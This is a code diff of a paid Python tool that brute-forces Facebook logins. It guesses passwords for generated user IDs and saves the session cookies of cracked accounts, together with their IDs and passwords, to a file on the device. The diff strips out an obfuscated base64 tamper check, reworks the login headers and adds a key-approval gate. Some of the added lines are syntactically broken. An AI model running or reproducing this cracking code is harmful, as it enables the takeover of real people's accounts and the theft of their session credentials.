@@ -1,4 +1,4 @@
-#--------------------------(IMPORT BOX)--------------------------#
+ #--------------------------(IMPORT BOX)--------------------------#
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
@@ -120,53 +120,24 @@ for txxxtt in range (1000):
 	h='Mobile Safari/537.36'
 	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
 	ugen.append(ffg)
-#===========#
-from requests import api
-x = open(api.__file__,'r').read()
-if "print" in x:
-    clr()
-elif "sys.stdout.write" in x:
-    clr()
-else:
-    pass
-from requests import sessions
- 
-x = open(sessions.__file__,'r').read()
-if "print" in x:
-    clr()
-elif "sys.stdout.write" in x:
-    clr()
-else:
-    pass
-from requests import models
-x = open(models.__file__,'r').read()
-if "print" in x:
-    clr()
- 
-elif "sys.stdout.write" in x:
-    clr()
-else:
-    pass
-try:
-    import mechanize
-except:
-    os.system(base64.b64decode(base64.b64decode("Y0dsd0lHbHVjM1JoYkd3Z2JXVmphR0Z1YVhwbElENGdMMlJsZGk5dWRXeHM=")))
-#==================#
 #--------------------------(LOGO BOX)--------------------------#
-logo=("""  
+logo =("""
 
 ███████╗ █████╗ ██████╗ ██████╗ ██╗██████╗ 
 ██╔════╝██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗
 ███████╗███████║██████╔╝██████╔╝██║██████╔╝
 ╚════██║██╔══██║██╔══██╗██╔══██╗██║██╔══██╗
 ███████║██║  ██║██████╔╝██████╔╝██║██║  ██║
-╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═╝                                                 
-\033[38;5;46m┌━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ☂️\033[38;5;46m━━━━━━━━━━━━━━━━━━┐\033[33;1m 
-\033[38;5;46m│ \033[1;92m[\033[1;92m<>\033[1;92m] \033[1;92m ☂️𝑨𝒖𝒕𝒉𝒐𝒓     \033[1;97m  :  \033[1;92m MD☂️ SABBIR BHAI \033[38;5;46m│ 
-\033[38;5;46m│ \033[1;92m[\033[1;92m<>\033[1;92m] \033[1;92m ☂️𝑮𝒊𝒕𝒉𝒖𝒃       \033[1;97m:  \033[1;92m Rdx337   \033[38;5;46m   │  
-\033[38;5;46m│ \033[1;92m[\033[1;92m<>\033[1;92m] \033[1;92m ☂️𝑽         \033[1;97m   :  \033[1;92m 0.1              \033[38;5;46m│
-\033[38;5;46m│ \033[1;92m[\033[1;92m<>\033[1;92m] \033[1;92m ☂️𝑷𝒐𝒘𝒆𝒓      \033[1;97m  :  \033[1;92m☂️ SABBIR \033[38;5;46m│
-\033[38;5;46m└━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┘""")
+╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═╝                                           
+\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mSABBIR SR
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mSABBIR SR
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m0.10
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ● \x1b[38;5;46mRandom Cloning
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ● \x1b[38;5;46mpaid
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ● \x1b[38;5;46m7dey150/15day200/30day300
+\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆""")
+
 linex=('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')   
 #--------------------------(MENU BOX)--------------------------#
 class Main:
@@ -177,8 +148,8 @@ class Main:
         self.loop = 0
         os.system("clear")
         print(logo)
-    #    os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
-        print('\033[1;31m[\033[1;32m1\033[1;31m]  \x1b[38;5;46m START🔴 RANDOM CLONE')
+       os.system('xdg-openhttps://www.facebook.com/profile.php?id=100089747571096')
+        print('\033[1;31m[\033[1;32m1\033[1;31m]  \x1b[38;5;46m START RANDOM CLONE')
         print('\033[1;31m[\033[1;32m2\033[1;31m]  \x1b[38;5;46m EXIT')
         print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
         Shorif =input("\033[1;32m[\033[1;32m?\033[1;32m] CHOOSE : ")
@@ -240,7 +211,7 @@ def rcrack1(uid,pwx,tl):
             bi = random.choice([A,B,C,D,E,F,G,H])
             sys.stdout.write(f'\r \033[1;31m[%sARAFAT\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -251,34 +222,34 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
-           'method': 'GET',
+            header_freefb = {'authority': 'p.facebook.com',
+           'method': 'GET', 
+       	'scheme': 'https', 
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-           'cache-control': 'max-age=0',
-           'dpr': '2.625',
-           'referer': 'https://www.facebook.com/',
-           'sec-ch-prefers-color-scheme': 'dark',
-           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-           'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-           'sec-ch-ua-mobile': '?0',
-           'sec-ch-ua-model': '""',
-           'sec-ch-ua-platform': '"Linux"',
-           'sec-ch-ua-platform-version': '""',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'same-origin',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': pro}
-
-            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+          'cache-control': 'max-age=0',
+          'dpr': '1.381250023841858',
+          'sec-ch-prefers-color-scheme': 'light',
+          'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+          'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
+          'sec-ch-ua-mobile': '?1',
+          'sec-ch-ua-model': '"V2043"',
+          'sec-ch-ua-platform': '"Android"',
+          'sec-ch-ua-platform-version': '"11.0.0"',
+          'sec-fetch-dest': 'document',
+          'sec-fetch-mode': 'navigate',
+          'sec-fetch-site': 'none',
+          'sec-fetch-user': '?1',
+          'upgrade-insecure-requests': '1',
+          'user-agent': pro,
+          'viewport-width': '980',}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\r\r\033[1;32m[SABBIR-XD-OK💙] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
-                open('/sdcard/SABBIR-SR-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
+                print(f"\033[38;5;46m[SABBIR-OK] {uid}|{ps}")
+                open('/sdcard/SABBIR-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
@@ -295,4 +266,33 @@ def rcrack1(uid,pwx,tl):
     except:
         pass
 
-Main()
+def shoha_menu():
+    UMO="IN-"
+    uuid = str(os.geteuid()) + str(os.getlogin()) 
+    id = "5".join(uuid)
+    print(logo)
+    DARK=requests.get("https://github.com/Rdx337/Sabbiropi/blob/main/Ap.txt").text
+    if id in DARK:
+        Main()
+    else:
+        os.system("clear")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100089747571096")
+        time.sleep(3.0)
+        
+        os.system("clear")
+        print(logo)
+        print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
+        print ("")
+        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
+        print ("")
+        print("                Your Key is Not Approved ")
+        print("               Copy And Send Key To Admin")
+        print ("")
+        print (" Your Key : "+UMO+id)
+        print ("\n")
+        name = input(" Your Name : ")
+        print ("")
+        input(" Press Enter To Send Key")
+        os.system("xdg-open https://wa.me/8801824772888")
+        shoha_menu()   
+shoha_menu()
